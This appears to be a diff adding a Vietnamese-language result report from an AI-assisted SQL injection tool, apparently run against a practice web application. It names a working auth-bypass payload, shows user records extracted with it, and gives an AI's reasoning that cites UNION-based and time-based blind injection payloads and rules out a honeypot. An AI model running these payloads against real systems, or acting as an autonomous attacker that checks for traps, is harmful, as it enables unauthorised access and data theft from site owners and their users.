@@ -1,0 +1,5 @@
+SQL Injection — AI Self-Validation hoàn tất.
+      - Payload tốt nhất   : 1' OR '1'='1
+      - Mục đích           : Classic OR Auth Bypass
+      - Output trích xuất  : ID: 1' OR '1'='1First name: adminSurname: admin | ID: 1' OR '1'='1First name: GordonSurname: Brown | ID: 1' OR '1'='1First name: HackSurname: Me | ID:
+      - AI Reasoning       : Từ output của payload '1' UNION SELECT null, user()#', chúng ta thấy được thông tin về người dùng 'app@localhost', điều này chứng tỏ lỗ hổng SQL Injection thực sự tồn tại. Ngoài ra, payload '1' AND SLEEP(5)#' cho thấy thời gian phản hồi tăng lên 5 giây, điều này cũng cho thấy lỗ hổng Blind Injection. Không có bằng chứng cho thấy honeypot vì các lỗi cấu hình không trả về output giả mạo.
